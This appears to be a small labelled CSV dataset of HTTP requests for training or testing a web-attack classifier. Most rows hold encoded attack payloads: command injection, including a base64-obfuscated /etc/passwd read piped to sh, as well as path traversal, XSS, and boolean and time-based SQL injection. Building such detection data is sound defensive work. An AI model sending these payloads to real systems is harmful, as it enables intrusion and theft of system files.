text,label
POST /login email=%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60&action=443&last_name=128&first_name=216 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /users/456?first_name=test%20%7Cc%27a%27t%20/etc/passwd%20entry&email=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /api/products view=125&user_id=%3Csvg%20onload%3Dalert%281%29%3E&format=test+user&search=John+Doe&old_password=test+user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /about name=please%20../../../etc/passwd%20entry&author=admin+access+request&sort=542&user_id=410 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /about?session=please+find+attached&page=671&view=system+log+entry&quantity=my%20%3B%20%24%28printf%20%27%5Cx6c%5Cx73%27%29%20entry&lang=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /js/app.js?color=237&old_password=885&email=%26%20whoami&user_id=348&q=123+Main+St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /images/logo.png token=best%20%60id%60%20user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /api/users?city=contact+me+at+email@example.com&token=%27%20AND%20%27x%27%3D%27x&page=admin+access+request&first_name=218 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /api/v1/data?new_password=532&password=466&token=167&phone=thank+you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /dashboard content=592&session=689&tracking=67&order_id=123%20%27%3B%20SELECT%20pg_sleep%285%29--%20world User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
